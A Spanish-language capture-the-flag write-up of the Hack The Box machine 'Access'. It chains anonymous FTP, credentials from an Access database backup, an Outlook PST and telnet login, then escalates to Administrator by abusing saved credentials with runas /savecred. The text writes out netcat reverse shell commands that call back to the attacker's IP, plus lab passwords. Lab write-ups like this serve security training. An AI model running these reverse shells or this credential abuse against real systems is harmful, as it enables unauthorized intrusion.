# Resolución maquina access

**Autor:** PepeMaquina  
**Fecha:** 30 de octubre de 2025  
**Dificultad:** Easy 
**Sistema Operativo:** Windows  
**Tags:** Mdb, Outlook, Telnet.

---
## Imagen de la Máquina

![](access.jpg)

*Imagen: access.JPG*

## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.10.98 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p21,23,80 10.10.10.98 -oN targeted
~~~
### Enumeración de Servicios

~~~bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
~~~
Con una vista rápida, se ve que esta maquina no pertenece a un dominio, los pocos puertos abiertos son el 80, 23 y 21, tambien se puede ver que la única forma de conectarse al servidor es mediante telnet (Un servicio nada seguro).
### Enumeración del servicio FTP
Como me gusta organizarme bien, lo primero que se hizo fue intentar iniciar sesion como "anonymous".
~~~bash
ftp anonymous@10.10.10.98 
Connected to 10.10.10.98.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp>
~~~
Por lo visto si permite el inicio de sesion como anonimo, esto es un error bastante grande pero hoy en dia no se lo ve mucho.
Ahora solo queda enumerar y descargar todo lo que se pueda, para no tener problemas en la descarga, active el modo "binary" y luego se descargo todo.
~~~bash
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|  5520 KiB  595.33 KiB/s    00:00 ETA
226 Transfer complete.
5652480 bytes received in 00:09 (595.32 KiB/s)

ftp> cd ..
250 CWD command successful.
ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************| 10870       17.01 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 45 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
10870 bytes received in 00:00 (17.01 KiB/s)
~~~
Por lo visto el servicio presenta dos archivos, uno que es "access control.zip" y otro "backup.mdb", para ello lo primero que hice es intentar descomprimir al archivo .zip porque parece tener cosas interesantes.
~~~bash
unzip Access\ Control.zip   
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
~~~
Al intentar hacerlo con "unzip" presenta errores, por lo que parece un tipo de cifrado, asi que utilizando un método mas moderno, se utiliza la herramienta "7z".
~~~bash
7z x Access\ Control.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
~~~
Al intentar descomprimirlo parece pedir una contraseña, para esto se hara lo tipico de unzip2john para obtener el hash y poder descifrarlo con hashcat.
~~~bash
zip2john Access\ Control.zip > hash_zip 
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/access/content]
└─$ cat hash_zip  
Access Control.zip/Access Control.pst:$zip2$*0*3*0*6f1cd9ae3480669b2b61dbb4c0fc7ce3*fef9*299a*7e03b2fdd0eb70b9e....<SNIP>......d45e3673d2ef9
~~~
A simple vista se puede ver que el hash es demasiado largo, tal parece que estuviera corrompido o que presenta una contraseña bastante fuerte, por lo que prefiero dejarlo de lado por el momento y escaneare el contenido del otro archivo "backup.mdb"
Primero se obtienen las tablas de la base de datos.
~~~bash
mdb-tables backup.mdb  
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
~~~
Esta presenta una gran cantidad de tablas, lo ideal seria verlo uno por uno, pero a simple vista me interesa mas una tabla llamada "auth_user". Por lo que se procede a enumerar su contenido.
~~~bash
mdb-sql backup.mdb
1 => SELECT * FROM auth_user
2 => ;

+-----------+-
|id         |username                                                                                            |password                                                                                            |Status     |last_login          |RoleID     |Remark                                                                                               
|25         |admin                                                                                               |admin                                                                                               |1          |08/23/18 21:11:47   |26         |                        
|27         |engineer                                                                                            |access4u@security                                                                                   |1          |08/23/18 21:13:36   |26         |                               
|28         |backup_admin                                                                                        |admin                                                                                               |1          |08/23/18 21:14:02   |26         |                       
+-----------+-
~~~
Al extraer los datos de esta tabla, se pudo obtener algunos posibles usuarios y credenciales, por lo que el usuario "engineer" coincide con el recurso compartido del servicio ftp, y recordando, en dicho recurso compartido se encontraba el archivo "access control.zip", por lo que jugando con la logica, me propongo a probar esa contraseña para descomprimir el archivo correctamente.
~~~bash
7z x Access\ Control.zip            

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Would you like to replace the existing file:
  Path:     ./Access Control.pst
  Size:     0 bytes
  Modified: 2025-10-30 13:41:05
with the file from archive:
  Path:     Access Control.pst
  Size:     271360 bytes (265 KiB)
  Modified: 2018-08-23 20:13:52
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                         
Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870
~~~
Con dicha contraseña si se pudo descomprimir el archivo correctamente, por lo que estamos en buen camino.
La descompresion resulto en un archivo "Access Control.pst". Al parecer esto es una especie de archivo manejado por outlook, como no se mucho sobre el tema, investigando en internet vi que se puede obtener distintos archivos con contenido, para ello primero creo un directorio.
~~~bash
mkdir outl
~~~
Para luego colocar el contenido legible del archivo en dicha carpeta.
~~~bash
readpst -r -o ./outl "Access Control.pst" 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
~~~
En este punto, inspeccionando el contenido dentro del directorio, se ve que es un "mbox", esto es un correo, posiblemente como lo almacene outlook.
Inpeccionando dicho mbox, se puede ver que tiene un mensaje muy util.
~~~bash
cat mbox                      
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-1954181331_-_-"


----boundary-LibPST-iamunique-1954181331_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-1954181331_-_-"

--alt---boundary-LibPST-iamunique-1954181331_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John


--alt---boundary-LibPST-iamunique-1954181331_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
        {mso-style-priority:99;
        color:#0563C1;
        text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
        {mso-style-priority:99;
        color:#954F72;
        text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
        {mso-style-name:msonormal;
        mso-margin-top-alt:auto;
        margin-right:0in;
        mso-margin-bottom-alt:auto;
        margin-left:0in;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
span.EmailStyle18
        {mso-style-type:personal-compose;
        font-family:"Calibri",sans-serif;
        color:windowtext;}
.MsoChpDefault
        {mso-style-type:export-only;
        font-size:10.0pt;
        font-family:"Calibri",sans-serif;}
@page WordSection1
        {size:8.5in 11.0in;
        margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
        {page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-1954181331_-_---

----boundary-LibPST-iamunique-1954181331_-_---
~~~
Resumiendo el contenido, esto habla sobre un usuario "security" y una contraseña para el mismo, ademas menciona otro nombre que puede ser un posible usuario, para todos estos siempre es bueno anotarlos por si pueden ser usuario validos.
~~~bash
cat ../users 
john
engineer
backup_admin
security
~~~
Con esto, se me ocurre probar dichas credenciales en el servicio "telnet" para poder obtener una sesion en el servidor.
~~~bash
telnet 10.10.10.98 23     
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\security>
~~~
Por suerte estas credenciales si fueron validas, otorgando acceso al servidor.

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con las ultimas credenciales ya probadas y verificadas, se prueba intentar obtener acceso mediante telnet, obteniendo asi la user flag.
~~~powershell
C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security

08/23/2018  10:52 PM    <DIR>          .
08/23/2018  10:52 PM    <DIR>          ..
08/24/2018  07:37 PM    <DIR>          .yawcam
08/21/2018  10:35 PM    <DIR>          Contacts
08/28/2018  06:51 AM    <DIR>          Desktop
08/21/2018  10:35 PM    <DIR>          Documents
08/21/2018  10:35 PM    <DIR>          Downloads
08/21/2018  10:35 PM    <DIR>          Favorites
08/21/2018  10:35 PM    <DIR>          Links
08/21/2018  10:35 PM    <DIR>          Music
08/21/2018  10:35 PM    <DIR>          Pictures
08/21/2018  10:35 PM    <DIR>          Saved Games
08/21/2018  10:35 PM    <DIR>          Searches
08/24/2018  07:39 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   3,346,513,920 bytes free

C:\Users\security>cd desktop

C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security\Desktop

08/28/2018  06:51 AM    <DIR>          .
08/28/2018  06:51 AM    <DIR>          ..
10/30/2025  05:03 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,346,513,920 bytes free

C:\Users\security\Desktop>type user.txt
<Encuentre su user flag>
~~~

---
## Escalada de Privilegios

### Revisión de permisos y/o privilegios
Realizando enumeración manual, se vio primero los privilegios que tenemos, por mala suerte no se pudo obtener nada.
Otra cosa que hago al enumerar manualmente es ver las sesiones activas, esto con comandos como:
~~~powershell
C:\Windows\System32>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
~~~
Como se puede ver, se tiene el usuario administrator como credenciales almacenadas dentro la sesion, por lo que esto se puede vulnerar con herramientas como "runas" o "mimikatz", para ello primero necesito pasarme la herramienta a mi servicio, adicionalmente para enviar una reverse shell, tambien enviare el "nc64.exe".
Primero abriendo un servicio smb en mi maquina atacante.
~~~bash
impacket-smbserver smb $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.98,49157)
[*] AUTHENTICATE_MESSAGE (ACCESS\security,ACCESS)
~~~
Ahora pasando los ejecutables a la maquina comprometida.
~~~bash
C:\temp>copy \\10.10.14.5\smb\runas.exe runas.exe
        1 file(s) copied.
        
C:\temp>copy \\10.10.14.5\smb\nc64.exe nc64.exe
        1 file(s) copied.

C:\temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\temp

10/31/2025  03:01 AM    <DIR>          .
10/31/2025  03:01 AM    <DIR>          ..
08/21/2018  10:25 PM    <DIR>          logs
05/14/2025  06:44 PM            45,272 nc64.exe
08/21/2018  10:25 PM    <DIR>   98,234 runas.exe
08/21/2018  10:25 PM    <DIR>          scripts
08/21/2018  10:25 PM    <DIR>          sqlsource
               1 File(s)         45,272 bytes
               5 Dir(s)   3,349,958,656 bytes free
~~~
Al intentar ejecutar algo, puedo ver que esto no es permitido.
~~~bash
C:\Users\security\Desktop>C:\temp\nc64.exe -e cmd 10.10.14.5 4433
This program is blocked by group policy. For more information, contact your system administrator.
~~~
Por lo que seria imposible ejecutar runas para obtener acceso como administrador.
Esto puede ser porque somo un usuario con bajos privilegios, por lo tanto podria ser que un usuario administrator si tenga permisos para ejecutar otros binarios.
En este punto se podria buscar de bypasear la politica de seguridad o buscar otro binario en el sistema para el cual se pueda hacer lo mismo.
Buscando punto por punto, se vio un ejecutable "runas.exe" dentro del directorio "system32"
~~~bash
C:\Windows\System32>dir
<SNIP>
07/14/2009  01:41 AM            91,648 rtrfiltr.dll
06/19/2010  06:53 AM            52,224 rtutils.dll
07/14/2009  03:20 AM    <DIR>          ru-RU
07/14/2009  01:39 AM            20,480 runas.exe
07/14/2009  01:39 AM            45,568 rundll32.exe
<SNIP>
~~~
Entonces, probando si el usuario administrator si podria tener permisos de ejecucion de programas, se envia una reverse shell impersonando al usuario "administrator", esto se puede hacer con el comando /savecred.
~~~bash
C:\Windows\System32>.\runas.exe /savecred /user:ACCESS\Administrator "C:\temp\nc64.exe 10.10.14.5 4433 -e cmd.exe"
~~~
Antes de enviarlo se deberia abrir un escucha en mi maquina atacante.
Una vez enviado el comando, se puede ver que si funciono.
~~~bash
rlwrap -cAr nc -nvlp 4433
listening on [any] 4433 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.98] 49158
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator
~~~
Teniendo acceso como el usuario administrator.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Ya con acceso como usuario administrator, se puede leer la root flag.
~~~powershell
C:\Windows\system32>cd C:\users\administrator
cd C:\users\administrator

C:\Users\Administrator>cd desktop
cd desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Encuentre su propio root flag>
~~~
🎉 Sistema completamente comprometido - Root obtenido

